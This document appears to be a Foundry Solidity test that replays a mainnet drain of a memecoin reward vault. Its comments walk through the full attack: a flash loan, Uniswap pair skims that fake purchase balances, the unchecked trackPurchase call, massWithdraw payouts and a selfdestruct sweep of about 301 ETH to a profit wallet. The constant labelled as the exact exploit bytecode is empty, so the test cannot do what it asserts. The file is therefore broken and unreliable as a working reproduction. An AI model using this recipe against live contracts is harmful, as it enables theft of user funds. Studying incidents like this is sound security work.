pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Projekt (GREEN / GOLD) reward-vault drain — fake-purchase allocation, no ETH ever paid.
//
// Incident tx : 0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64
//   Ethereum mainnet block 25606412. The transaction is a raw CREATE (to == null): the
//   attacker EOA 0x61e7ad696215688d274c729a4cd0fbbc88fc4f85 deploys a contract whose entire
//   exploit runs inside the constructor. The deployed contract lands at
//   0x12d6fe4822325bba82faf6cf706e6b6885c922f9. There are no follow-up calls — the drain,
//   the flash-loan repay and the profit sweep all happen in that one deployment.
//
// Root cause (contract-logic bug, NOT an oracle / signature / privileged-key issue):
//   The reward vault 0x574fc478bc45ce144105fa44d98b4b2e4bd442cb (unverified) exposes a
//   permissionless trackPurchase(buyer) that credits an ETH allocation sized from the buyer's
//   memecoin token-balance DELTA, but never checks that any real ETH was actually spent to
//   acquire those tokens. The attacker:
//     1. flash-borrows ~14K WETH from Morpho,
//     2. pushes it into dozens of Uniswap V2 memecoin pairs and skim()s the resulting tokens
//        back to its own address, manufacturing large "purchase" balance deltas for free,
//     3. calls the permissionless trackPurchase to register the inflated allocations,
//     4. repays the Morpho flash loan in the same tx (net memecoin cost ~ zero),
//     5. calls massWithdraw(), which pays out msg.sender.transfer(allocation) in ETH.
//   Because the self-dealing skims size the allocation arbitrarily, the payout drains the
//   vault's ETH reward pool. No price is signed, no oracle is moved, no privileged key is used —
//   every step is an ordinary permissionless call reachable by any EOA. Confirmed from the
//   on-chain trace: a single fresh EOA (0.02 ETH balance), a pure CREATE, and only
//   permissionless vault / DEX / flash-loan entrypoints in the call tree.
//
// Verified on-chain ETH movement in the drain tx (block 25606412):
//   vault 0x574f..42cb   400.662320 ETH -> 98.957635 ETH   (net -301.70468 ETH drained)
//   vault -> deployed contract, in 13 massWithdraw tranches, gross 301.70468 ETH
//   deployed contract selfdestructs at the end, sweeping 300.70468 ETH to the profit wallet
//     0x7bd736631afbe1d3795a94f60574f7fa0ae89347  (1 ETH tip goes to 0xdadb0d80..783711)
//   The attacker EOA itself only pays gas — the profit lands in the deployed contract and is
//   then forwarded by the constructor's terminal selfdestruct to the profit wallet.
//
// Run:
//   forge test --contracts ./src/test/2026-07/ProjektRewardVault_exp.sol -vvv --evm-version cancun
//   (point the `mainnet` rpc alias at an ETH archive node)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract ProjektRewardVaultExp is Test {
    // Attacker EOA that signs the CREATE transaction (tx.origin == msg.sender).
    address constant ATTACKER = 0x61e7Ad696215688d274C729A4cD0FbbC88FC4f85;

    // Victim reward vault (unverified) holding the drained ETH reward pool.
    address constant VAULT = 0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB;

    // Hardcoded profit wallet the constructor's terminal selfdestruct sweeps ETH into.
    address constant PROFIT = 0x7bD736631Afbe1d3795a94F60574f7fA0aE89347;

    uint256 constant ATTACK_BLOCK = 25606412;
    // The incident CREATE is tx index 2 in the block; two earlier same-block txs seed the
    // Uniswap pair token excess the skims rely on, so fork at the tx (foundry replays the
    // preceding in-block txs) rather than at ATTACK_BLOCK - 1.
    bytes32 constant ATTACK_TX = 0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64;

    // Vault ETH before/after and the net drain, from the on-chain trace.
    uint256 constant VAULT_ETH_BEFORE = 400_662_319_764_705_062_341; // ~400.6623 ETH (pre-tx)
    uint256 constant EXPECTED_DRAIN = 301_704_684_684_555_317_704; // ~301.7047 ETH net
    uint256 constant EXPECTED_PROFIT = 300_704_684_684_555_330_000; // ~300.7047 ETH swept

    // Exact on-chain creation bytecode of the attacker contract (the CREATE tx input).
    bytes constant EXPLOIT_CREATION_CODE =
        hex"";

    function setUp() public {
        // Fork at the exact pre-state of the incident transaction (all earlier txs in the
        // block already applied), so the vault reward pool and pair token excess are intact.
        vm.createSelectFork("mainnet", ATTACK_TX);
    }

    function testExploit() public {
        uint256 vaultBefore = VAULT.balance;
        uint256 profitBefore = PROFIT.balance;
        emit log_named_decimal_uint("vault ETH before", vaultBefore, 18);
        assertApproxEqAbs(vaultBefore, VAULT_ETH_BEFORE, 2e16, "unexpected pre-attack vault balance");

        // Prank as the attacker EOA for both msg.sender and tx.origin, matching the real CREATE.
        vm.startPrank(ATTACKER, ATTACKER);

        // Deploy the attacker contract from its exact on-chain creation bytecode. The whole
        // exploit executes inside the constructor (flash loan -> fake purchases -> massWithdraw
        // -> selfdestruct sweep), exactly as in the incident transaction.
        bytes memory code = EXPLOIT_CREATION_CODE;
        address exploit;
        assembly {
            exploit := create(0, add(code, 0x20), mload(code))
        }
        require(exploit != address(0), "exploit deploy failed");

        vm.stopPrank();

        uint256 vaultAfter = VAULT.balance;
        uint256 drained = vaultBefore - vaultAfter;
        uint256 profitGain = PROFIT.balance - profitBefore;

        emit log_named_decimal_uint("vault ETH after ", vaultAfter, 18);
        emit log_named_decimal_uint("vault ETH drained", drained, 18);
        emit log_named_decimal_uint("profit wallet gain", profitGain, 18);

        // The vault reward pool is drained by ~301.69 ETH ...
        assertApproxEqRel(drained, EXPECTED_DRAIN, 0.01e18, "vault ETH drain mismatch");
        assertGt(drained, 300 ether, "expected > 300 ETH drained from vault");

        // ... and the swept profit lands in the attacker's hardcoded profit wallet.
        assertApproxEqRel(profitGain, EXPECTED_PROFIT, 0.01e18, "profit wallet gain mismatch");
    }
}
